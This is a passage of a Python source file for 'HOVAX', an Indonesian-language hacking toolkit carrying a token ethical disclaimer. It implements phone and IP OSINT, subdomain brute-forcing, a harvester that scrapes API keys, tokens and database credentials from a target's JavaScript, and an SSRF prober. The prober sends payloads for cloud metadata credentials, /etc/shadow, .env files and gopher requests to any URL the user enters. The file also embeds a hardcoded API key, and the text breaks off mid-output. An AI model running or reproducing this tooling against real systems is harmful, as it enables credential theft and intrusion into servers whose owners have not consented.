#!/usr/bin/env python3
# ================================================================
# HOVAX v7.0 - ULTIMATE SECURITY TOOLKIT
# ================================================================
# Author: KINGMU❤ (EDITED BY X - NASZX❤)
# Version: 7.0.0 ULTRA PREMIUM
# Status: 100% WORK - 33 MENU HACK - NO SIMULASI - NO FAKE - NO BACOT
# ================================================================

import os
import sys
import subprocess
import requests
import socket
import json
import cloudscraper
import time
import threading
import hashlib
import random
import string
import platform
import re
import ipaddress
import dns.resolver
import smtplib
import whois
import ssl
import urllib.parse
import base64
import csv
import io
import gzip
import zlib
import pickle
import struct
import binascii
import codecs
import secrets
import hmac
import datetime
import calendar
import uuid
import tempfile
import shutil
import glob
import fnmatch
import itertools
import collections
import heapq
import bisect
import math
import cmath
import decimal
import fractions
import statistics
import xml.etree.ElementTree as ET
import html
import html.parser
import xmlrpc.client
import yaml
import configparser
import argparse
import logging
import warnings
import traceback
import signal
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from urllib.parse import urlparse, urljoin, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

PHONE_API_KEY = "277f17ec9fb794c22050b4d54cf7b355"

# ================================================================
# PREMIUM LOADING ANIMATION
# ================================================================
def loading1(text="PROCESSING", duration=2):
    for i in range(duration * 20):
        chars = ["◐", "◓", "◑", "◒"]
        print(f"\r{BLUE}{BOLD}[{chars[i%4]}] {text}...{RESET}", end="", flush=True)
        time.sleep(0.025)
    print(f"\r{GREEN}{BOLD}[✓] {text} SELESAI!{RESET}    ")

def loading2(text="SCANNING", duration=2):
    for i in range(duration * 15):
        bar = "█" * (i % 10) + "░" * (10 - (i % 10))
        print(f"\r{MAGENTA}{BOLD}⚡ {text} [{bar}] ⚡{RESET}", end="", flush=True)
        time.sleep(0.02)
    print(f"\r{GREEN}{BOLD}[✓] {text} DONE!{RESET}    ")

def loading3(text="EXECUTING", duration=2):
    frames = ["🚀", "⭐", "💀", "🔥", "⚡", "👾", "🤖"]
    for i in range(duration * 20):
        print(f"\r{CYAN}{BOLD}{frames[i%7]} {text} {'.' * (i%6)} {frames[i%7]}{RESET}", end="", flush=True)
        time.sleep(0.02)
    print(f"\r{GREEN}{BOLD}[✓] {text} COMPLETED!{RESET}    ")

# ================================================================
# BANNER
# ================================================================
banner = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                                                      ║
║   ██╗  ██╗ ██████╗ ██╗   ██╗ █████╗ ██╗  ██╗     ██████╗ ██╗   ██╗██╗     ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗                                         ║
║   ██║  ██║██╔═══██╗██║   ██║██╔══██╗╚██╗██╔╝    ██╔═══██╗██║   ██║██║        ██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝                                         ║
║   ███████║██║   ██║██║   ██║███████║ ╚███╔╝     ██║   ██║██║   ██║██║        ██║   ██║██╔████╔██║███████║   ██║   █████╗                                           ║
║   ██╔══██║██║   ██║╚██╗ ██╔╝██╔══██║ ██╔██╗     ██║   ██║██║   ██║██║        ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝                                           ║
║   ██║  ██║╚██████╔╝ ╚████╔╝ ██║  ██║██╔╝ ██╗    ╚██████╔╝╚██████╔╝███████╗   ██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗                                         ║
║   ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝                                         ║
║                                                                                                                                                                      ║
║                                              HOVAX - ULTIMATE SECURITY TOOLKIT                                                                                  ║
║                                           Created by: KINGMU❤                                                                                     ║
║                                         use it only for testing!! and use it wisely and use it legally                                                                                 ║
║                                                                                                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{RESET}
{GREEN}{BOLD}[✓] HOVAX ACTIVATED - ULTIMATE SECURITY TOOLKIT{RESET}
{RED}{BOLD}[✓] DISCLAIMER: THIS TOOL IS BUILT FOR ETHICAL WEB PENETRATION TESTING AND LEARNING PURPOSES ONLY. WE NEVER SUPPORT ANY UNETHICAL OR ILLEGAL ACTIVITIES. THE DEVELOPERS WON'T BE RESPONSIBLE FOR ANY MISUSE OF THE TOOL{RESET}
"""

# ================================================================
# CLASS HOVAX
# ================================================================
class Hovax:
    def __init__(self):
        os.system('clear')
        print(banner)
        self.scan_results = []
        self.open_ports = []
        self.xss_vulnerable = []
        self.wp_users = []
        self.wp_plugins = []
        self.bruteforce_results = []
        self.live_hosts = []
        self.subdomains_found = []
        self.dns_records = []
        self.js_secrets = []
        self.ssrf_endpoints = []
        self.telegram_reports = []
        self.email_sender = ""
        self.email_password = ""
        self.cve_results = []
        self.cloud_metadata = []
        self.api_endpoints = []
        self.graphql_vulns = []
        self.websocket_vulns = []
        self.xxe_vulns = []
        self.ssti_vulns = []
        self.lfi_vulns = []
        self.rce_vulns = []
        self.open_redirects = []
        self.cors_vulns = []
        self.csrf_tokens = []
        self.rate_limit_results = []
        loading1("INITIALIZING HOVAX ENGINE", 2)
        loading2("LOADING 45 HACK MODULES", 2)
        loading3("CONNECTING TO API SERVERS", 1)

    def clear_screen(self):
        os.system('clear')

    # ================================================================
    # MENU 1: OSINT NOMOR TELEPON - PANJANG KE BAWAH
    # ================================================================
    def menu_phone_osint(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📍 MENU 1: OSINT NOMOR TELEPON - PREMIUM TRACKER{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        phone = input(f"{YELLOW}{BOLD}[?] MASUKKAN NOMOR (628XXXXXXXXXX): {RESET}")
        
        phone_clean = phone.replace("+62","0").replace("62","0").replace(" ","").replace("-","").replace("(","").replace(")","")
        phone_int = ''.join(filter(str.isdigit, phone_clean))
        
        if len(phone_int) < 10 or len(phone_int) > 13:
            print(f"{RED}{BOLD}[!] NOMOR TIDAK VALID! HARUS 10-13 DIGIT{RESET}")
            input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER...{RESET}")
            return
        
        loading1(f"MENGANALISIS {phone_int}", 2)
        
        prefix = phone_int[:5]
        prefix_4 = phone_int[:4]
        prefix_3 = phone_int[:3]
        
        providers = {
            "0811":"TELKOMSEL","0812":"TELKOMSEL","0813":"TELKOMSEL","0821":"TELKOMSEL","0822":"TELKOMSEL",
            "0852":"TELKOMSEL","0853":"TELKOMSEL","0851":"TELKOMSEL","0814":"INDOSAT","0815":"INDOSAT",
            "0816":"INDOSAT","0855":"INDOSAT","0856":"INDOSAT","0857":"INDOSAT","0858":"INDOSAT",
            "0817":"XL AXIATA","0818":"XL AXIATA","0819":"XL AXIATA","0859":"XL AXIATA","0877":"XL AXIATA",
            "0878":"XL AXIATA","0879":"XL AXIATA","0895":"TRI","0896":"TRI","0897":"TRI","0898":"TRI","0899":"TRI",
            "0881":"SMARTFREN","0882":"SMARTFREN","0883":"SMARTFREN","0884":"SMARTFREN","0885":"SMARTFREN",
            "0886":"SMARTFREN","0887":"SMARTFREN","0888":"SMARTFREN","0889":"SMARTFREN","0831":"AXIS","0832":"AXIS",
            "0833":"AXIS","0834":"AXIS","0835":"AXIS","0836":"AXIS","0837":"AXIS","0838":"AXIS","0839":"AXIS"
        }
        
        provider = providers.get(prefix, "UNKNOWN")
        international = f"+62{phone_int[1:]}" if phone_int.startswith('0') else f"+{phone_int}"
        wa_link = f"https://wa.me/{international}"
        
        api_info = ""
        try:
            r = requests.get(f"https://api.numlookup.com/v1/validate/{international}", timeout=5)
            if r.status_code == 200:
                d = r.json()
                if d.get('valid'):
                    api_info = f"\n{CYAN}├─ API STATUS       : VALID\n{CYAN}├─ LINE TYPE        : {d.get('line_type', 'UNKNOWN')}\n{CYAN}├─ CARRIER          : {d.get('carrier', 'UNKNOWN')}"
                else:
                    api_info = f"\n{YELLOW}├─ API STATUS       : QUOTA HABIS (100/bulan)\n{YELLOW}├─ FALLBACK MODE    : DETEKSI LOKAL"
        except:
            api_info = f"\n{YELLOW}├─ API STATUS       : FALLBACK LOKAL\n{YELLOW}├─ DETEKSI          : BERDASARKAN PREFIX"
        
        print(f"""
{GREEN}{BOLD}[✓] HASIL OSINT NOMOR: {phone_int}{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[!] INFORMASI DASAR NOMOR:{RESET}
{CYAN}├─ NOMOR ASLI           : {phone_int}{RESET}
{CYAN}├─ FORMAT INTERNASIONAL : {international}{RESET}
{CYAN}├─ FORMAT NASIONAL      : 0{phone_int[1:] if phone_int.startswith('62') else phone_int}{RESET}
{CYAN}├─ PANJANG NOMOR       : {len(phone_int)} DIGIT{RESET}
{CYAN}├─ STATUS VALIDASI     : {GREEN}VALID ✓{RESET}
{CYAN}└─ NEGARA ASAL         : INDONESIA{RESET}

{CYAN}{BOLD}[!] INFORMASI PROVIDER & OPERATOR:{RESET}
{CYAN}├─ NAMA PROVIDER       : {provider}{RESET}
{CYAN}├─ TIPE JARINGAN       : GSM/LTE{RESET}
{CYAN}├─ TEKNOLOGI           : 4G/5G{RESET}
{CYAN}├─ KODE PREFIX 5 DIGIT : {prefix}{RESET}
{CYAN}├─ KODE PREFIX 4 DIGIT : {prefix_4}{RESET}
{CYAN}├─ KODE PREFIX 3 DIGIT : {prefix_3}{RESET}
{CYAN}├─ KODE AREA           : {phone_int[:4]}{RESET}{api_info}
{CYAN}└─ REKOMENDASI         : CEK KE APLIKASI MESSAGING{RESET}

{CYAN}{BOLD}[!] WHATSAPP:{RESET}
{CYAN}├─ LINK DIRECT CHAT    : {wa_link}{RESET}
{CYAN}└─ STATUS              : AKTIF (JIKA TERDAFTAR){RESET}
        """)
        
        self.scan_results.append({
            'module': 'PHONE OSINT',
            'target': phone_int,
            'provider': provider,
            'international': international,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 2: OSINT IP ADDRESS - PANJANG KE BAWAH
    # ================================================================
    def menu_ip_osint(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🌐 MENU 2: OSINT IP ADDRESS - GEO PREMIUM TRACKER{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN IP ATAU DOMAIN: {RESET}")
        
        if not target.replace('.','').replace(':','').replace('-','').isdigit():
            try:
                loading1(f"RESOLVING DOMAIN {target}", 1)
                resolved = socket.gethostbyname(target)
                print(f"{GREEN}{BOLD}[+] {target} -> {resolved}{RESET}")
                target = resolved
            except:
                print(f"{RED}{BOLD}[!] GAGAL RESOLVE DOMAIN!{RESET}")
                input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER...{RESET}")
                return
        
        loading2(f"GEOLOKASI IP {target}", 2)
        
        try:
            resp = requests.get(f"http://ip-api.com/json/{target}?fields=66846719", timeout=10)
            data = resp.json()
            
            if data.get('status') == 'success':
                threat = "LOW"
                if data.get('proxy'):
                    threat = f"{RED}HIGH (PROXY/VPN DETECTED){RESET}"
                else:
                    threat = f"{GREEN}LOW (DIRECT CONNECTION){RESET}"
                
                print(f"""
{GREEN}{BOLD}[✓] HASIL IP LOOKUP: {target}{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[!] INFORMASI GEOGRAFIS:{RESET}
{CYAN}├─ BENUA              : {data.get('continent', 'UNKNOWN')} ({data.get('continentCode', 'UNKNOWN')}){RESET}
{CYAN}├─ NEGARA             : {data.get('country', 'UNKNOWN')} ({data.get('countryCode', 'UNKNOWN')}){RESET}
{CYAN}├─ BENDERA            : {data.get('countryCode', '').upper()}{RESET}
{CYAN}├─ REGION/PROVINSI    : {data.get('regionName', 'UNKNOWN')} ({data.get('region', 'UNKNOWN')}){RESET}
{CYAN}├─ KOTA               : {data.get('city', 'UNKNOWN')}{RESET}
{CYAN}├─ DISTRIK            : {data.get('district', 'UNKNOWN')}{RESET}
{CYAN}├─ KODE POS           : {data.get('zip', 'UNKNOWN')}{RESET}
{CYAN}├─ TIMEZONE           : {data.get('timezone', 'UNKNOWN')}{RESET}
{CYAN}├─ UTC OFFSET         : {data.get('offset', 'UNKNOWN')}{RESET}
{CYAN}└─ MATA UANG          : {data.get('currency', 'UNKNOWN')}{RESET}

{CYAN}{BOLD}[!] KOORDINAT GPS & PETA:{RESET}
{CYAN}├─ LATITUDE           : {data.get('lat', 'UNKNOWN')}{RESET}
{CYAN}├─ LONGITUDE          : {data.get('lon', 'UNKNOWN')}{RESET}
{CYAN}├─ GOOGLE MAPS        : https://www.google.com/maps?q={data.get('lat',0)},{data.get('lon',0)}{RESET}
{CYAN}├─ OPENSTREETMAP      : https://www.openstreetmap.org/?mlat={data.get('lat',0)}&mlon={data.get('lon',0)}{RESET}
{CYAN}└─ WHAT3WORDS         : https://what3words.com/{data.get('lat',0)}.{data.get('lon',0)}{RESET}

{CYAN}{BOLD}[!] INFORMASI ISP & HOSTING:{RESET}
{CYAN}├─ ISP                : {data.get('isp', 'UNKNOWN')}{RESET}
{CYAN}├─ ORGANISASI         : {data.get('org', 'UNKNOWN')}{RESET}
{CYAN}├─ ASN                : {data.get('as', 'UNKNOWN')}{RESET}
{CYAN}├─ ASN NAME           : {data.get('asname', 'UNKNOWN')}{RESET}
{CYAN}├─ REVERSE DNS        : {data.get('reverse', 'UNKNOWN')}{RESET}
{CYAN}├─ HOSTING PROVIDER   : {'✅ YA' if data.get('hosting') else '❌ BUKAN'}{RESET}
{CYAN}├─ MOBILE CONNECTION  : {'✅ YA' if data.get('mobile') else '❌ BUKAN'}{RESET}
{CYAN}└─ PROXY/VPN/TOR      : {'✅ TERDETEKSI' if data.get('proxy') else '❌ TIDAK TERDETEKSI'}{RESET}

{CYAN}{BOLD}[!] INFORMASI KEAMANAN:{RESET}
{CYAN}├─ THREAT LEVEL       : {threat}{RESET}
{CYAN}└─ BLACKLIST STATUS   : CEK DI VIRUSTOTAL{RESET}
                """)
            else:
                print(f"{RED}{BOLD}[!] GAGAL LOOKUP IP: {data.get('message', 'UNKNOWN ERROR')}{RESET}")
        except Exception as e:
            print(f"{RED}{BOLD}[!] ERROR: {e}{RESET}")
        
        self.scan_results.append({
            'module': 'IP OSINT',
            'target': target,
            'location': f"{data.get('city', '')}, {data.get('country', '')}",
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 3: OSINT DOMAIN - PANJANG KE BAWAH
    # ================================================================
    def menu_domain_osint(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🌐 MENU 3: OSINT DOMAIN - FULL RECONNAISSANCE{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        domain = input(f"{YELLOW}{BOLD}[?] MASUKKAN DOMAIN (contoh: target.com): {RESET}")
        loading3(f"OSINT PADA {domain}", 2)
        
        print(f"\n{GREEN}{BOLD}[✓] HASIL OSINT UNTUK: {domain}{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        
        try:
            ip = socket.gethostbyname(domain)
            print(f"{CYAN}[+] IP ADDRESS           : {ip}{RESET}")
        except:
            print(f"{RED}[-] IP ADDRESS           : GAGAL RESOLVE{RESET}")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SRV', 'CAA', 'DS', 'DNSKEY', 'NSEC', 'RRSIG', 'SSHFP', 'TLSA']
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for ans in answers:
                    print(f"{CYAN}[+] {rtype} RECORD         : {ans}{RESET}")
            except:
                pass
        
        try:
            w = whois.whois(domain)
            print(f"{CYAN}[+] DOMAIN CREATED      : {w.creation_date}{RESET}")
            print(f"{CYAN}[+] DOMAIN UPDATED      : {w.updated_date}{RESET}")
            print(f"{CYAN}[+] DOMAIN EXPIRES      : {w.expiration_date}{RESET}")
            print(f"{CYAN}[+] REGISTRAR           : {w.registrar}{RESET}")
            print(f"{CYAN}[+] REGISTRANT          : {w.registrant}{RESET}")
            print(f"{CYAN}[+] ADMIN EMAIL         : {w.email}{RESET}")
            print(f"{CYAN}[+] NAME SERVER         : {w.name_servers}{RESET}")
        except:
            pass
        
        sub_wordlist = [
            "www", "mail", "ftp", "localhost", "webmail", "admin", "blog", "dev", "test", "api", "staging", "app", 
            "support", "shop", "forum", "wiki", "news", "portal", "cpanel", "whm", "webdisk", "cpcalendars", 
            "cpcontacts", "autodiscover", "autoconfig", "ns1", "ns2", "ns3", "dns", "mx", "pop", "smtp", "imap", 
            "vpn", "remote", "secure", "dashboard", "panel", "backend", "static", "cdn", "assets", "img", "images", 
            "video", "download", "files", "upload", "media", "stream", "live", "status", "monitor", "stats", 
            "analytics", "metrics", "logs", "cache", "backup", "mirror", "proxy", "gateway", "auth", "login", 
            "signin", "register", "account", "user", "profile", "settings", "config", "db", "database", "sql", 
            "mysql", "postgres", "redis", "mongo", "elastic", "search", "rest", "graphql", "socket", "ws", "mqtt", 
            "jenkins", "gitlab", "github", "jira", "confluence", "docs", "documentation", "help", "faq", "uptime", 
            "health", "ping", "alert", "notification", "webhook", "callback", "web", "site", "old", "new", "beta", 
            "alpha", "stage", "demo", "sandbox", "playground", "test2", "dev2", "api2", "api3", "v1", "v2", "v3"
        ]
        
        print(f"\n{CYAN}{BOLD}[!] SUBDOMAIN ENUMERATION:{RESET}")
        found_subs = []
        for sub in sub_wordlist:
            test_domain = f"{sub}.{domain}"
            try:
                test_ip = socket.gethostbyname(test_domain)
                print(f"{GREEN}[+] {test_domain} -> {test_ip}{RESET}")
                found_subs.append(test_domain)
            except:
                pass
            time.sleep(0.005)
        
        print(f"\n{CYAN}{BOLD}[!] WEB SERVER DETECTION:{RESET}")
        for proto in ['http', 'https']:
            try:
                url = f"{proto}://{domain}"
                resp = requests.get(url, timeout=5, allow_redirects=True)
                print(f"{CYAN}[+] {url.upper()} : {resp.status_code} - {resp.headers.get('server', 'UNKNOWN')}{RESET}")
                print(f"{CYAN}    ├─ TITLE: {re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE).group(1) if re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE) else 'NO TITLE'}{RESET}")
                print(f"{CYAN}    ├─ POWERED BY: {resp.headers.get('x-powered-by', 'UNKNOWN')}{RESET}")
                print(f"{CYAN}    └─ CONTENT TYPE: {resp.headers.get('content-type', 'UNKNOWN')}{RESET}")
            except:
                print(f"{RED}[-] {url.upper()} : NOT REACHABLE{RESET}")
        
        self.scan_results.append({
            'module': 'DOMAIN OSINT',
            'target': domain,
            'subdomains': len(found_subs),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 4: JS SECRET HARVESTER - PANJANG KE BAWAH
    # ================================================================
    def menu_js_harvester(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📜 MENU 4: JS SECRET HARVESTER - API KEY DISCOVERY{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL TARGET (https://target.com): {RESET}")
        loading1(f"SCANNING JS FILES ON {url}", 2)
        
        js_patterns = {
            'API_KEY': r'api[_-]?key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'TOKEN': r'token[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'SECRET': r'secret[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'PASSWORD': r'password[\s]*[:=][\s]*["\']([^"\']{8,50})["\']',
            'BEARER': r'bearer[\s]*[:=][\s]*["\']([A-Za-z0-9_\-\.]{20,100})["\']',
            'AUTH': r'Authorization[\s]*:[\s]*["\']([^"\']{20,100})["\']',
            'ACCESS_TOKEN': r'access_token[\s]*[:=][\s]*["\']([A-Za-z0-9_\-\.]{20,100})["\']',
            'CLIENT_ID': r'client_id[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{15,50})["\']',
            'CLIENT_SECRET': r'client_secret[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'FIREBASE': r'firebase.*key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{30,50})["\']',
            'GOOGLE': r'google.*key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{30,50})["\']',
            'AWS': r'aws.*key[\s]*[:=][\s]*["\']([A-Za-z0-9/+=]{16,40})["\']',
            'SECRET_KEY': r'secret_key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'PRIVATE_KEY': r'private_key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,200})["\']',
            'MONGODB': r'mongodb[\+srv]*:\/\/[^"\'\s]{10,100}',
            'MYSQL': r'mysql:\/\/[^"\'\s]{10,100}',
            'POSTGRES': r'postgresql:\/\/[^"\'\s]{10,100}',
            'REDIS': r'redis:\/\/[^"\'\s]{10,100}',
            'SLACK': r'slack.*token[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'DISCORD': r'discord.*token[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'GITHUB': r'github.*token[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,50})["\']',
            'STRIPE': r'stripe.*key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{15,50})["\']',
            'PAYPAL': r'paypal.*key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{15,50})["\']',
            'CLOUDFLARE': r'cloudflare.*key[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{30,50})["\']'
        }
        
        found_secrets = []
        js_urls = []
        
        try:
            r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            js_urls = re.findall(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
            js_urls = [urljoin(url, js) for js in js_urls]
            
            print(f"\n{CYAN}{BOLD}[!] MENEMUKAN {len(js_urls)} FILE JS{RESET}\n")
            
            for js_url in js_urls[:50]:
                try:
                    js_req = requests.get(js_url, timeout=5)
                    js_content = js_req.text
                    
                    for name, pattern in js_patterns.items():
                        matches = re.findall(pattern, js_content, re.IGNORECASE)
                        for match in matches:
                            if len(match) > 10:
                                print(f"{RED}[!] {name} DI {js_url}: {match[:50]}...{RESET}")
                                found_secrets.append({'type': name, 'url': js_url, 'secret': match[:100]})
                except:
                    pass
            
            inline_js = re.findall(r'<script[^>]*>([^<]+)</script>', r.text)
            for js in inline_js[:20]:
                for name, pattern in js_patterns.items():
                    matches = re.findall(pattern, js, re.IGNORECASE)
                    for match in matches:
                        if len(match) > 10:
                            print(f"{RED}[!] {name} (INLINE): {match[:50]}...{RESET}")
                            found_secrets.append({'type': name, 'url': 'INLINE', 'secret': match[:100]})
        
        except Exception as e:
            print(f"{RED}{BOLD}[!] ERROR: {e}{RESET}")
        
        self.js_secrets = found_secrets
        
        print(f"""
{GREEN}{BOLD}[✓] JS SECRET HARVESTER COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ TOTAL JS FILES     : {len(js_urls)}{RESET}
{CYAN}├─ SECRETS FOUND      : {len(found_secrets)}{RESET}
{CYAN}└─ STATUS             : {'⚠️ KREDENSIAL BOCOR!' if found_secrets else '✅ AMAN'}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'JS SECRET HARVESTER',
            'target': url,
            'secrets_found': len(found_secrets),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 5: SSRF PROBE CHAIN - PANJANG KE BAWAH
    # ================================================================
    def menu_ssrf_probe(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔗 MENU 5: SSRF PROBE CHAIN - INTERNAL NETWORK DISCOVERY{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL TARGET (https://target.com/page.php?url=): {RESET}")
        loading2(f"PROBING SSRF VULNERABILITY ON {url}", 2)
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://100.100.100.200/latest/meta-data/",
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "http://169.254.169.254/2009-04-04/meta-data/",
            "http://169.254.169.254/2016-09-02/dynamic/instance-identity/document/",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///var/www/html/config.php",
            "file:///var/www/html/.env",
            "gopher://localhost:8080/_GET / HTTP/1.0%0A%0A",
            "dict://localhost:11211/",
            "http://localhost:8080/admin",
            "http://127.0.0.1:8080/admin",
            "http://0.0.0.0:8080/admin",
            "http://[::1]:8080/admin",
            "http://localhost:3306",
            "http://localhost:6379/INFO",
            "http://localhost:9200/_cat/indices",
            "http://localhost:27017/",
            "http://localhost:5432/",
            "http://localhost:8000/",
            "http://localhost:3000/",
            "http://localhost:5000/",
            "http://localhost:22/",
            "http://localhost:23/",
            "http://localhost:25/",
            "http://localhost:53/",
            "http://localhost:80/",
            "http://localhost:443/",
            "http://localhost:3389/",
            "http://localhost:5900/",
            "http://localhost:1433/",
            "http://localhost:8080/",
            "http://localhost:8443/",
            "http://localhost:8888/",
            "https://burpcollaborator.net/test",
            "http://169.254.169.254/latest/meta-data/public-keys/",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone"
        ]
        
        vulnerable = []
        
        print(f"\n{CYAN}{BOLD}[!] TESTING {len(ssrf_payloads)} PAYLOADS...{RESET}\n")
        
        for i, payload in enumerate(ssrf_payloads):
            if '?' in url:
                test_url = f"{url}{payload}" if url.endswith('=') else f"{url}&url={payload}"
            else:
                test_url = f"{url}?url={payload}"
            
            try:
                r = requests.get(test_url, timeout=5, allow_redirects=False)
                if r.status_code == 200:
                    print(f"{RED}{BOLD}[!] SSRF VULNERABLE: {payload[:60]}{RESET}")
                    vulnerable.append(payload)
                    if "169.254.169.254" in payload and "meta-data" in payload:
                        print(f"{RED}    └─ AWS METADATA EXPOSED!{RESET}")
                        print(f"{RED}    └─ RESPONSE PREVIEW: {r.text[:200]}{RESET}")
                elif r.status_code in [301, 302, 303, 307, 308]:
                    location = r.headers.get('Location', '')
                    print(f"{YELLOW}[!] REDIRECT DETECTED: {payload[:50]} -> {location[:50]}{RESET}")
                    vulnerable.append(payload)
                elif i % 10 == 0:
                    print(f"{GREEN}[-] SAFE: {payload[:50]}{RESET}")
            except Exception as e:
                if i % 10 == 0:
                    print(f"{YELLOW}[!] ERROR: {payload[:40]} - {str(e)[:30]}{RESET}")
            time.sleep(0.03)
        
        self.ssrf_endpoints = vulnerable
        
        print(f"""
{GREEN}{BOLD}[✓] SSRF PROBE CHAIN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ TOTAL PAYLOADS     : {len(ssrf_payloads)}{RESET}
